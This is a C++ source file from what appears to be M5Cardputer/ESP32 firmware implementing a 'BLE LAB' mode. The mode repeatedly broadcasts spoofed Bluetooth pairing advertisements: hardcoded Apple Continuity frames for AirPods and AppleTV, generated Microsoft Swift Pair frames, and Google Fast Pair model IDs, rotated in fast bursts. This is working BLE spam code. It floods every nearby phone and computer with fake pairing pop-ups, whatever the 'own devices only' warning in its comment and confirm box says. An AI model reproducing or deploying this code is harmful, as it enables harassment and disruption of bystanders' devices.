// Raw BLE pairing-frame advertise. Own / lab devices only.
#include "blepig.h"
#include "../core/config.h"
#include "../core/app.h"
#include "../ui/display.h"
#include "../ui/keys.h"
#include "../piglet/avatar.h"
#include "../audio/sfx.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>
#include <esp_random.h>
#include <string.h>
#include <stdio.h>
#include <string>

bool BlePigMode::running = false;
uint32_t BlePigMode::bursts = 0;
uint32_t BlePigMode::lastBurstMs = 0;
uint32_t BlePigMode::sessionStart = 0;
char BlePigMode::lastName[24] = "-";
BlePigMode::Family BlePigMode::family = BlePigMode::Family::APPLE;

static BLEAdvertising* s_adv = nullptr;
static bool s_bleUp = false;

// Continuity / Nearby Action frames (manufacturer 0x004C)
static const uint8_t kAirpods[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
    0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t kAirpodsPro[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
    0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t kAirpodsMax[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
    0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t kAirpodsG2[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
    0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t kBeatsFlex[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
    0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t kAppleTvSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t kAppleTvPair[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t kAppleTvAudio[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t kSetupPhone[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

struct AppleSlot {
    const uint8_t* data;
    uint8_t len;
    const char* name;
};
static const AppleSlot kApple[] = {
    {kAirpods, 31, "AirPods"},
    {kAirpodsPro, 31, "AirPods Pro"},
    {kAirpodsMax, 31, "AirPods Max"},
    {kAirpodsG2, 31, "AirPods G2"},
    {kBeatsFlex, 31, "Beats Flex"},
    {kAppleTvSetup, 23, "AppleTV Setup"},
    {kAppleTvPair, 23, "AppleTV Pair"},
    {kAppleTvAudio, 23, "AppleTV Audio"},
    {kSetupPhone, 23, "Setup Phone"},
};
static const uint8_t kAppleN = sizeof(kApple) / sizeof(kApple[0]);

static const uint32_t kDroid[] = {
    0x0000F0, 0xCD8256, 0x821F66, 0xF52494, 0x92BBBD, 0x000006,
    0xD446A7, 0x2D7A23, 0x01EEB4, 0x038CC7, 0x0582FD, 0x00AA48
};
static const char* kDroidName[] = {
    "Bose QC35", "Bose NC700", "JBL Flip 6", "JBL Buds", "Pixel Buds", "Pixel Buds",
    "Sony XM5", "Sony XM4", "WH-1000XM4", "JBL 760NC", "Pixel Buds", "Jabra Elite"
};
static const uint8_t kDroidN = sizeof(kDroid) / sizeof(kDroid[0]);

static const char* familyName(BlePigMode::Family f) {
    switch (f) {
        case BlePigMode::Family::APPLE: return "APPLE";
        case BlePigMode::Family::WIN:   return "WIN";
        case BlePigMode::Family::DROID: return "DROID";
        default:                        return "MIX";
    }
}

static void setLast(const char* n) {
    strncpy(BlePigMode::lastName, n ? n : "-", sizeof(BlePigMode::lastName) - 1);
    BlePigMode::lastName[sizeof(BlePigMode::lastName) - 1] = '\0';
}

static bool pushRaw(const uint8_t* pkt, size_t n) {
    if (!s_adv || !pkt || n < 3) return false;
    BLEAdvertisementData ad;
    ad.addData(std::string(reinterpret_cast<const char*>(pkt), n));
    s_adv->setAdvertisementData(ad);
    return true;
}

static void buildSwift(uint8_t* pkt, size_t* outLen, char* nameOut, size_t nameLen) {
    char name[12];
    uint8_t nlen = (uint8_t)(4 + (esp_random() % 6));
    static const char* syl[] = {"bo", "ka", "li", "mo", "ne", "pi", "ra", "su", "te", "vu", "xo", "zi"};
    name[0] = '\0';
    while (strlen(name) + 2 < nlen && strlen(name) + 3 < sizeof(name))
        strncat(name, syl[esp_random() % 12], sizeof(name) - strlen(name) - 1);
    uint8_t nl = (uint8_t)strlen(name);
    uint8_t size = (uint8_t)(7 + nl);
    pkt[0] = (uint8_t)(size - 1);
    pkt[1] = 0xFF;
    pkt[2] = 0x06;
    pkt[3] = 0x00;
    pkt[4] = 0x03;
    pkt[5] = 0x00;
    pkt[6] = 0x80;
    memcpy(pkt + 7, name, nl);
    *outLen = size;
    snprintf(nameOut, nameLen, "Win %s", name);
}

static void buildDroid(uint8_t* pkt, size_t* outLen, const char** label) {
    uint8_t i = (uint8_t)(esp_random() % kDroidN);
    uint32_t model = kDroid[i];
    pkt[0] = 3; pkt[1] = 0x03; pkt[2] = 0x2C; pkt[3] = 0xFE;
    pkt[4] = 6; pkt[5] = 0x16; pkt[6] = 0x2C; pkt[7] = 0xFE;
    pkt[8] = (uint8_t)((model >> 16) & 0xFF);
    pkt[9] = (uint8_t)((model >> 8) & 0xFF);
    pkt[10] = (uint8_t)(model & 0xFF);
    pkt[11] = 2; pkt[12] = 0x0A;
    pkt[13] = (uint8_t)((esp_random() % 120) - 100);
    *outLen = 14;
    *label = kDroidName[i];
}

static void fireOne() {
    if (!s_adv) return;
    s_adv->stop();

    BlePigMode::Family f = BlePigMode::family;
    if (f == BlePigMode::Family::MIX)
        f = (BlePigMode::Family)(esp_random() % 3);

    uint8_t buf[40];
    size_t n = 0;
    char winName[24];
    const char* droid = nullptr;

    if (f == BlePigMode::Family::APPLE) {
        const AppleSlot& s = kApple[esp_random() % kAppleN];
        pushRaw(s.data, s.len);
        setLast(s.name);
    } else if (f == BlePigMode::Family::WIN) {
        buildSwift(buf, &n, winName, sizeof(winName));
        pushRaw(buf, n);
        setLast(winName);
    } else {
        buildDroid(buf, &n, &droid);
        pushRaw(buf, n);
        setLast(droid);
    }

    s_adv->setMinInterval(0x20);
    s_adv->setMaxInterval(0x20);
    s_adv->start();
}

void BlePigMode::start() {
    bool ok = Display::showConfirmBox(
        "BLE LAB",
        "OWN DEVICES ONLY\nApple / Win / Android\nraw pairing frames");
    if (!ok) {
        running = false;
        return;
    }

    WiFi.mode(WIFI_OFF);
    delay(50);

    if (s_bleUp) {
        if (s_adv) s_adv->stop();
        BLEDevice::deinit(false);
        s_adv = nullptr;
        s_bleUp = false;
        delay(30);
    }

    BLEDevice::init("");
    s_adv = BLEDevice::getAdvertising();
    s_bleUp = (s_adv != nullptr);
    if (!s_adv) {
        Display::showToast("BLE FAIL", 1200);
        running = false;
        return;
    }
    s_adv->setAdvertisementType(ADV_TYPE_NONCONN_IND);

    bursts = 0;
    lastBurstMs = 0;
    sessionStart = millis();
    if (family > Family::MIX) family = Family::APPLE;
    running = true;
    fireOne();
    bursts = 1;
    Avatar::setState(AvatarState::HUNTING);
    Display::showToast("BLE ON", 800);
}

void BlePigMode::stop() {
    running = false;
    if (s_adv) s_adv->stop();
    if (s_bleUp) {
        BLEDevice::deinit(false);
        s_adv = nullptr;
        s_bleUp = false;
    }
    Avatar::setState(AvatarState::NEUTRAL);
}

void BlePigMode::update() {
    if (!running) return;

    static bool keyWas = false;
    if (App::windowHidden()) {
        keyWas = false;
    } else if (!M5Cardputer.Keyboard.isPressed()) {
        keyWas = false;
    } else if (!keyWas) {
        keyWas = true;
        if (keyEsc()) {
            stop();
            return;
        }
        if (M5Cardputer.Keyboard.isKeyPressed(';') ||
            M5Cardputer.Keyboard.isKeyPressed('.')) {
            uint8_t f = (uint8_t)family;
            if (M5Cardputer.Keyboard.isKeyPressed(';'))
                f = (uint8_t)((f + 3) % 4);
            else
                f = (uint8_t)((f + 1) % 4);
            family = (Family)f;
            SFX::play(SFX::MENU_CLICK);
            lastBurstMs = 0;
        }
    }

    uint32_t now = millis();
    uint16_t gap = Config::ble().burstMs;
    if (gap < 60) gap = 60;
    if (now - lastBurstMs < gap) return;
    lastBurstMs = now;
    fireOne();
    bursts++;
}

void BlePigMode::getStatusLine(char* out, size_t len) {
    if (!out || !len) return;
    if ((millis() % 7500u) >= 5000u)
        snprintf(out, len, "^/v FAMILY  ESC EXIT");
    else
        snprintf(out, len, "BLE %s %lu", familyName(family), (unsigned long)bursts);
}

void BlePigMode::draw(M5Canvas& canvas) {
    canvas.fillSprite(UiStyle::BG);
    canvas.setTextSize(1);
    canvas.setTextDatum(top_left);
    canvas.setFont(&fonts::Font0);

    canvas.setTextColor(UiStyle::TITLE);
    canvas.drawString("BLE LAB", 4, 2);
    canvas.setTextColor(UiStyle::GREEN);
    canvas.drawString("ON", DISPLAY_W - 20, 2);

    canvas.setTextColor(UiStyle::DIM);
    canvas.drawString(familyName(family), 4, 18);
    canvas.setTextColor(UiStyle::CYAN);
    canvas.setTextSize(2);
    canvas.drawString(lastName, 4, 30);
    canvas.setTextSize(1);

    char buf[40];
    canvas.setTextColor(UiStyle::TEXT);
    snprintf(buf, sizeof(buf), "BURST %lu", (unsigned long)bursts);
    canvas.drawString(buf, 4, 56);
    snprintf(buf, sizeof(buf), "GAP %ums", (unsigned)Config::ble().burstMs);
    canvas.setTextColor(UiStyle::DIM);
    canvas.drawString(buf, 4, 70);

    uint32_t sec = (millis() - sessionStart) / 1000;
    snprintf(buf, sizeof(buf), "%us", (unsigned)sec);
    canvas.drawString(buf, 4, 84);

}
